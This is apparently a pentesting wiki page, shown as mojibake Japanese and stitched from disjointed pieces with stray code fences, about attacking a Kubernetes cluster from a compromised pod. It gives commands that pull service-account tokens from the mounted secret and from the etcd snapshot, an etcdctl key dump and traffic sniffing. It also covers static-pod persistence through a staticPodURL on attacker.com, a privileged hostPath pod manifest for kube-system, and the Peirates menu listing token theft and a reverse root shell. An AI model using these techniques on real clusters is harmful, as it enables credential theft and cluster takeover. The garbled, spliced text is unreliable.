Podå†…ã‹ã‚‰Kubernetes APIã‚µãƒ¼ãƒãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã¯ã€æ”»æ’ƒè€…ãŒã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æ¢ç´¢ã—ã€æ½œåœ¨çš„ãªæ”»æ’ƒãƒ™ã‚¯ãƒˆãƒ«ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã®ä¸€èˆ¬çš„ãªæ‰‹æ³•ã§ã™ã€‚Podã¯ã€APIã‚µãƒ¼ãƒãƒ¼ã¨é€šä¿¡ã™ã‚‹ãŸã‚ã«ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®æ¨©é™ãŒä¸é©åˆ‡ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ”»æ’ƒè€…ã¯ã‚¯ãƒ©ã‚¹ã‚¿å†…ã§æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®å–å¾—

Podã¯ã€`/var/run/secrets/kubernetes.io/serviceaccount/token`ã«ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦APIã‚µãƒ¼ãƒãƒ¼ã¨é€šä¿¡ã—ã¾ã™ã€‚æ”»æ’ƒè€…ãŒã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚Œã°ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®æ¨©é™å†…ã§è¡Œå‹•ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### APIã‚µãƒ¼ãƒãƒ¼ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆ

ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€æ”»æ’ƒè€…ã¯`kubectl`ã‚³ãƒãƒ³ãƒ‰ã‚„ç›´æ¥HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ä»‹ã—ã¦APIã‚µãƒ¼ãƒãƒ¼ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ãƒªã‚½ãƒ¼ã‚¹æƒ…å ±ã‚’å–å¾—ã—ãŸã‚Šã€æ§‹æˆã‚’å¤‰æ›´ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®æ¨©é™ã®æ˜‡æ ¼

æ”»æ’ƒè€…ãŒã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€ã‚¯ãƒ©ã‚¹ã‚¿å†…ã§ã‚ˆã‚Šå¤šãã®æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã«ã¯ã€Roleã‚„RoleBindingã®ä½œæˆã‚„å¤‰æ›´ãŒå«ã¾ã‚Œã¾ã™ã€‚

### Roleã¨RoleBindingã®ç†è§£

Roleã¯ã€Kubernetesãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹ç‰¹å®šã®æ¨©é™ã‚’å®šç¾©ã—ã¾ã™ã€‚RoleBindingã¯ã€ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ã‚°ãƒ«ãƒ¼ãƒ—ã«Roleã‚’å‰²ã‚Šå½“ã¦ã‚‹ã“ã¨ã§ã€ãã®æ¨©é™ã‚’ä»˜ä¸ã—ã¾ã™ã€‚

### æ¨©é™ã®æ˜‡æ ¼ã®ãŸã‚ã®Roleã¨RoleBindingã®ä½œæˆ

æ”»æ’ƒè€…ã¯ã€æ—¢å­˜ã®Roleã‚„RoleBindingã‚’å¤‰æ›´ã™ã‚‹ã‹ã€æ–°ã—ã„Roleã‚„RoleBindingã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ã‚¯ãƒ©ã‚¹ã‚¿å†…ã§ã‚ˆã‚Šå¤šãã®æ¨©é™ã‚’æŒã¤ã“ã¨ãŒã§ãã¾ã™ã€‚

## çµè«–

Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¯ã€æ”»æ’ƒè€…ãŒæ¨©é™ã‚’æ˜‡æ ¼ã•ã›ãŸã‚Šã€æ©Ÿå¯†æƒ…å ±ã‚’æ¼æ´©ã•ã›ãŸã‚Šã™ã‚‹ãƒªã‚¹ã‚¯ã‚’æœ€å°é™ã«æŠ‘ãˆã‚‹ãŸã‚ã«é‡è¦ã§ã™ã€‚Podå†…ã‹ã‚‰ã®æ”»æ’ƒã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä½“åˆ¶ã‚’è©•ä¾¡ã™ã‚‹ãŸã‚ã®pentestingã®ä¸€ç’°ã¨ã—ã¦è¡Œã‚ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚é©åˆ‡ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã¨ç›£è¦–ã‚’å®Ÿæ–½ã™ã‚‹ã“ã¨ã§ã€ã“ã‚Œã‚‰ã®ãƒªã‚¹ã‚¯ã‚’è»½æ¸›ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
```bash
data-dir=/var/lib/etcd
```
**etcdãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤ºã™ã‚‹ï¼š**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŠ½å‡ºã—ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆåã‚’è¡¨ç¤ºã™ã‚‹**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**åŒã˜ã‚³ãƒãƒ³ãƒ‰ã§ã™ãŒã€kube-systemãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®ã¿ã‚’è¿”ã™ãŸã‚ã®ã„ãã¤ã‹ã®grepãŒã‚ã‚Šã¾ã™**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
# Kuberneteså†…ã®Podã‹ã‚‰ã®æ”»æ’ƒ

Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹Podã‹ã‚‰æ”»æ’ƒã‚’é–‹å§‹ã™ã‚‹ã“ã¨ã¯ã€æ”»æ’ƒè€…ãŒã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€æ½œåœ¨çš„ãªè„†å¼±æ€§ã‚’æ¢ç´¢ã™ã‚‹ãŸã‚ã®ä¸€èˆ¬çš„ãªæ‰‹æ³•ã§ã™ã€‚ã“ã®æ–‡æ›¸ã§ã¯ã€Podå†…ã‹ã‚‰Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã‚’æ”»æ’ƒã™ã‚‹ãŸã‚ã®ã„ãã¤ã‹ã®æ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚

## æ¨©é™æ˜‡æ ¼

Podå†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€é€šå¸¸ã€é™å®šã•ã‚ŒãŸæ¨©é™ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€è¨­å®šã®èª¤ã‚Šã‚„è„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ã€ã‚ˆã‚Šé«˜ã„æ¨©é™ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

### ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®æ‚ªç”¨

Kubernetesã¯ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä»‹ã—ã¦Podã«APIã‚µãƒ¼ãƒãƒ¼ã¨ã®èªè¨¼æƒ…å ±ã‚’æä¾›ã—ã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯Podã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«ãƒã‚¦ãƒ³ãƒˆã•ã‚Œã€æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ä»–ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### ãƒˆãƒ¼ã‚¯ãƒ³ã®ç™ºè¦‹

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ãŒä¿å­˜ã•ã‚Œã¦ã„ã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### ãƒˆãƒ¼ã‚¯ãƒ³ã®ä½¿ç”¨

å–å¾—ã—ãŸãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€Kubernetes APIã«å¯¾ã—ã¦èªè¨¼ã•ã‚ŒãŸãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

```bash
curl https://kubernetes.default.svc.cluster.local/api --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦Kubernetes APIã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚

## æƒ…å ±åé›†

æ”»æ’ƒè€…ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®æƒ…å ±ã‚’åé›†ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒã‚’è¨ˆç”»ã—ã‚„ã™ããªã‚Šã¾ã™ã€‚

### APIã‚µãƒ¼ãƒãƒ¼ã®æ¢ç´¢

Kubernetes APIã‚µãƒ¼ãƒãƒ¼ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ç®¡ç†ã¨æ“ä½œã«ä½¿ç”¨ã•ã‚Œã‚‹ä¸­å¿ƒçš„ãªã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã™ã€‚æ”»æ’ƒè€…ã¯APIã‚µãƒ¼ãƒãƒ¼ã‚’æ¢ç´¢ã—ã¦ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®æ§‹æˆã‚„å®Ÿè¡Œä¸­ã®ã‚µãƒ¼ãƒ“ã‚¹ã«é–¢ã™ã‚‹æƒ…å ±ã‚’åé›†ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### APIãƒªã‚½ãƒ¼ã‚¹ã®ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—

```bash
kubectl get all --all-namespaces
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®ã™ã¹ã¦ã®ãƒªã‚½ãƒ¼ã‚¹ã®ãƒªã‚¹ãƒˆã‚’å–å¾—ã§ãã¾ã™ã€‚

### etcdã®æ¢ç´¢

etcdã¯ã€Kubernetesã®è¨­å®šæƒ…å ±ã¨çŠ¶æ…‹æƒ…å ±ã‚’ä¿æŒã™ã‚‹ã‚­ãƒ¼ãƒãƒªãƒ¥ãƒ¼ã‚¹ãƒˆã‚¢ã§ã™ã€‚æ”»æ’ƒè€…ã¯etcdã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€æ©Ÿå¯†æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### etcdã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

etcdã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯é€šå¸¸ã€APIã‚µãƒ¼ãƒãƒ¼ã‚’ä»‹ã—ã¦è¡Œã‚ã‚Œã¾ã™ãŒã€ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

```bash
ETCDCTL_API=3 etcdctl --endpoints=https://[etcd-server-endpoint]:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get / --prefix --keys-only
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€etcdã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã—ã¦èªè¨¼ã•ã‚ŒãŸã‚¢ã‚¯ã‚»ã‚¹ã‚’è©¦ã¿ã€ã‚­ãƒ¼ã®ãƒªã‚¹ãƒˆã‚’å–å¾—ã—ã¾ã™ã€‚

## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

Podã‹ã‚‰ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ç›£è¦–ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ä»–ã®Podã‚„ã‚µãƒ¼ãƒ“ã‚¹é–“ã®é€šä¿¡ã‚’å‚å—ã—ã€æ©Ÿå¯†æƒ…å ±ã‚’åé›†ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### tcpdumpã®ä½¿ç”¨

tcpdumpã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—åˆ†æã™ã‚‹ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã§ã™ã€‚

```bash
tcpdump -i any
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã™ã¹ã¦ã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¾ã™ã€‚

## çµè«–

Podã‹ã‚‰Kubernetesã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã‚’æ”»æ’ƒã™ã‚‹ã“ã¨ã¯ã€æ”»æ’ƒè€…ã«ã¨ã£ã¦æœ‰åŠ¹ãªæ‰‹æ®µã§ã™ã€‚æ¨©é™æ˜‡æ ¼ã€æƒ…å ±åé›†ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ãªã©ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã®è„†å¼±æ€§ã‚’ç™ºè¦‹ã—ã€æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### ã‚¹ã‚¿ãƒ†ã‚£ãƒƒã‚¯/ãƒŸãƒ©ãƒ¼ãƒãƒƒãƒ‰ã®æ°¸ç¶šæ€§

_ã‚¹ã‚¿ãƒ†ã‚£ãƒƒã‚¯ãƒãƒƒãƒ‰_ ã¯ã€APIã‚µãƒ¼ãƒãƒ¼ãŒç›£è¦–ã›ãšã«ã€ç‰¹å®šã®ãƒãƒ¼ãƒ‰ä¸Šã®kubeletãƒ‡ãƒ¼ãƒ¢ãƒ³ã«ã‚ˆã£ã¦ç›´æ¥ç®¡ç†ã•ã‚Œã¾ã™ã€‚ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ«ãƒ—ãƒ¬ãƒ¼ãƒ³ï¼ˆä¾‹ãˆã°ã€ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆï¼‰ã«ã‚ˆã£ã¦ç®¡ç†ã•ã‚Œã‚‹ãƒãƒƒãƒ‰ã¨ã¯ç•°ãªã‚Šã€**kubeletã¯å„ã‚¹ã‚¿ãƒ†ã‚£ãƒƒã‚¯ãƒãƒƒãƒ‰ã‚’ç›£è¦–**ï¼ˆãã—ã¦ã€å¤±æ•—ã—ãŸå ´åˆã«ã¯å†èµ·å‹•ã—ã¾ã™ï¼‰ã€‚

ã—ãŸãŒã£ã¦ã€ã‚¹ã‚¿ãƒ†ã‚£ãƒƒã‚¯ãƒãƒƒãƒ‰ã¯å¸¸ã«ç‰¹å®šã®ãƒãƒ¼ãƒ‰ä¸Šã®ä¸€ã¤ã®Kubeletã«**æŸç¸›ã•ã‚Œã¾ã™**ã€‚

**kubeletã¯è‡ªå‹•çš„ã«Kubernetes APIã‚µãƒ¼ãƒãƒ¼ä¸Šã«ãƒŸãƒ©ãƒ¼ãƒãƒƒãƒ‰ã‚’ä½œæˆã—ã‚ˆã†ã¨ã—ã¾ã™**ã€‚ã“ã‚Œã¯ã€ãƒãƒ¼ãƒ‰ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ãƒãƒƒãƒ‰ãŒAPIã‚µãƒ¼ãƒãƒ¼ä¸Šã§è¦‹ãˆã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ãŒã€ãã“ã‹ã‚‰åˆ¶å¾¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãƒãƒƒãƒ‰åã¯ãƒãƒ¼ãƒ‰ãƒ›ã‚¹ãƒˆåã‚’æ¥é ­è¾ã¨ã—ã¦ãƒã‚¤ãƒ•ãƒ³ãŒä»˜ãã¾ã™ã€‚

{% hint style="danger" %}
ã‚¹ã‚¿ãƒ†ã‚£ãƒƒã‚¯ãƒãƒƒãƒ‰ã®**`spec`ã¯ä»–ã®APIã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’å‚ç…§ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ï¼ˆä¾‹ï¼šServiceAccountã€ConfigMapã€Secretãªã©ï¼‰ã€‚ã—ãŸãŒã£ã¦ã€**ç¾åœ¨ã®ãƒãƒ¼ãƒ‰ã§ä»»æ„ã®serviceAccountã‚’æŒã¤ãƒãƒƒãƒ‰ã‚’èµ·å‹•ã—ã¦ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã‚’ä¾µå®³ã™ã‚‹è¡Œç‚ºã¯ã§ãã¾ã›ã‚“**ã€‚ã—ã‹ã—ã€ç•°ãªã‚‹ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã§ãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã“ã‚Œã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã¯å¯èƒ½ã§ã™ï¼ˆä½•ã‚‰ã‹ã®ç†ç”±ã§å½¹ç«‹ã¤å ´åˆï¼‰ã€‚
{% endhint %}

ãƒãƒ¼ãƒ‰ãƒ›ã‚¹ãƒˆå†…ã«ã„ã‚‹å ´åˆã€**è‡ªèº«å†…ã«ã‚¹ã‚¿ãƒ†ã‚£ãƒƒã‚¯ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯éå¸¸ã«ä¾¿åˆ©ã§ã™ã€‚ãªãœãªã‚‰ã€**kube-system**ã®ã‚ˆã†ãª**ç•°ãªã‚‹ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã«ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹**ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œãªã„ã‹ã‚‰ã§ã™ã€‚

ã‚¹ã‚¿ãƒ†ã‚£ãƒƒã‚¯ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«ã¯ã€[**ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆãŒå¤§å¤‰å½¹ç«‹ã¡ã¾ã™**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)ã€‚åŸºæœ¬çš„ã«å¿…è¦ãªã®ã¯2ã¤ã®ã“ã¨ã§ã™ï¼š

* **kubeletã‚µãƒ¼ãƒ“ã‚¹**ã¾ãŸã¯**kubeletè¨­å®š**ï¼ˆ[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)ï¼‰ã§ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**`--pod-manifest-path=/etc/kubernetes/manifests`**ã‚’è¨­å®šã—ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚’å†èµ·å‹•ã™ã‚‹
* **`/etc/kubernetes/manifests`**ã«**ãƒãƒƒãƒ‰å®šç¾©**ã‚’ä½œæˆã™ã‚‹

**ã‚‚ã†ä¸€ã¤ã®ã‚ˆã‚Šéš å¯†ãªæ–¹æ³•ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š**

* **kubelet**è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**`staticPodURL`**ã‚’å¤‰æ›´ã—ã€`staticPodURL: http://attacker.com:8765/pod.yaml`ã®ã‚ˆã†ã«è¨­å®šã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€kubeletãƒ—ãƒ­ã‚»ã‚¹ã¯æŒ‡å®šã•ã‚ŒãŸURLã‹ã‚‰ã®**è¨­å®šã‚’å–å¾—ã—ã¦ã‚¹ã‚¿ãƒ†ã‚£ãƒƒã‚¯ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã—ã¾ã™ã€‚

**ä¾‹**ï¼š**kube-system**ã§ç‰¹æ¨©ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹**ãƒãƒƒãƒ‰**ã®è¨­å®šã¯[**ã“ã¡ã‚‰**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)ã‹ã‚‰å–å¾—ã—ã¾ã—ãŸï¼š
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### ãƒãƒƒãƒ‰ã®å‰Šé™¤ + ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ä¸å¯ãƒãƒ¼ãƒ‰

æ”»æ’ƒè€…ãŒ**ãƒãƒ¼ãƒ‰ã‚’ä¾µå®³**ã—ã€ä»–ã®ãƒãƒ¼ãƒ‰ã‹ã‚‰**ãƒãƒƒãƒ‰ã‚’å‰Šé™¤**ã—ã€ä»–ã®ãƒãƒ¼ãƒ‰ãŒãƒãƒƒãƒ‰ã‚’å®Ÿè¡Œ**ã§ããªã„ã‚ˆã†ã«ã™ã‚‹**ã¨ã€ãƒãƒƒãƒ‰ã¯ä¾µå®³ã•ã‚ŒãŸãƒãƒ¼ãƒ‰ã§å†å®Ÿè¡Œã•ã‚Œã€ãã“ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚\
[**è©³ç´°ã¯ã“ã¡ã‚‰ã®ãƒªãƒ³ã‚¯ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)ã€‚

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
